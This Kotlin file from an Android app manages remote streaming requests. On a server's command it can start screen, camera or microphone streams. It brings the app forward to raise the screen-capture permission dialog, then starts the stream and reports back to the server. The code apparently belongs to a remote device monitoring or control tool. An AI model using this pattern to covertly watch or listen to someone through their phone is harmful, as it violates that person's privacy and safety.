package com.abuzahra.manager.streaming

import android.content.Context
import android.content.Intent
import android.util.Log
import com.abuzahra.manager.MainActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * PendingStreamManager - Manages pending stream requests that need permissions.
 *
 * When a streaming command arrives but MediaProjection permission is not available,
 * this manager stores the pending request and auto-triggers the permission dialog.
 * Once permission is granted (via MainActivity.onActivityResult), the pending stream
 * auto-starts without requiring a new command from the server.
 *
 * For Camera and Mic permissions: These are standard runtime permissions that persist.
 * If already granted, the stream starts immediately (handled by StreamExecutor).
 */
object PendingStreamManager {

    private const val TAG = "PendingStreamManager"

    // Properly scoped coroutine scope instead of unscoped CoroutineScope(Dispatchers.IO).launch
    private val managerScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    data class PendingRequest(
        val streamType: String, // "screen", "camera_front", "camera_back", "audio_mic", "audio_device"
        val params: Map<String, Any>,
        val timestamp: Long = System.currentTimeMillis()
    )

    private var pendingRequest: PendingRequest? = null
    private var waitingForPermission = false

    /**
     * Called when a streaming command arrives but MediaProjection is needed.
     * Stores the request and triggers the permission dialog automatically.
     * Returns a "requesting_permission" status to tell the dashboard to wait.
     */
    fun requestPermissionAndStart(context: Context, streamType: String, params: Map<String, Any>): Map<String, Any> {
        Log.i(TAG, "Storing pending stream request: $streamType")

        pendingRequest = PendingRequest(streamType, params)
        waitingForPermission = true

        // Launch the MediaProjection permission request via MainActivity
        launchPermissionRequest(context)

        // Return status indicating we're waiting for permission
        return mapOf(
            "status" to "requesting_permission",
            "message" to "جاري طلب إذن التسجيل...",
            "stream_type" to streamType
        )
    }

    /**
     * Called from MainActivity.onActivityResult when MediaProjection permission is granted.
     * Automatically starts the pending stream.
     */
    fun onPermissionGranted(context: Context) {
        Log.i(TAG, "MediaProjection permission granted, checking for pending stream...")

        val request = pendingRequest ?: run {
            Log.i(TAG, "No pending stream request")
            return
        }

        pendingRequest = null
        waitingForPermission = false

        // Start the pending stream on a background thread
        managerScope.launch {
            try {
                Log.i(TAG, "Auto-starting pending stream: ${request.streamType}")
                val result = executePendingStream(context, request)

                // Notify the server of the result
                com.abuzahra.manager.api.ApiClient.sendData(
                    context,
                    "stream_auto_started",
                    mapOf(
                        "stream_type" to request.streamType,
                        "result" to result
                    )
                )

                Log.i(TAG, "Pending stream started: $result")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to auto-start pending stream", e)
            }
        }
    }

    /**
     * Called when MediaProjection permission is denied
     */
    fun onPermissionDenied() {
        Log.w(TAG, "MediaProjection permission denied")
        pendingRequest = null
        waitingForPermission = false
    }

    /**
     * Check if there's a pending request waiting for permission
     */
    fun hasPendingRequest(): Boolean = pendingRequest != null

    /**
     * Get the current pending request
     */
    fun getPendingRequest(): PendingRequest? = pendingRequest

    /**
     * Cancel any pending request
     */
    fun cancelPending() {
        pendingRequest = null
        waitingForPermission = false
    }

    /**
     * Launch the MediaProjection permission request by bringing MainActivity to foreground
     */
    private fun launchPermissionRequest(context: Context) {
        try {
            val intent = Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                putExtra("request_media_projection", true)
            }
            context.startActivity(intent)
            Log.i(TAG, "Launched MainActivity for MediaProjection permission")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to launch permission request", e)
        }
    }

    /**
     * Execute the pending stream request
     */
    private fun executePendingStream(context: Context, request: PendingRequest): Map<String, Any> {
        return when (request.streamType) {
            "screen" -> com.abuzahra.manager.executor.StreamExecutor.startScreenStream(context, request.params)
            "camera_front", "camera_back" -> com.abuzahra.manager.executor.StreamExecutor.startCameraStream(context, request.params)
            "audio_mic", "audio_device" -> com.abuzahra.manager.executor.StreamExecutor.startAudioStream(context, request.params)
            else -> mapOf("status" to "error", "message" to "Unknown stream type: ${request.streamType}")
        }
    }
}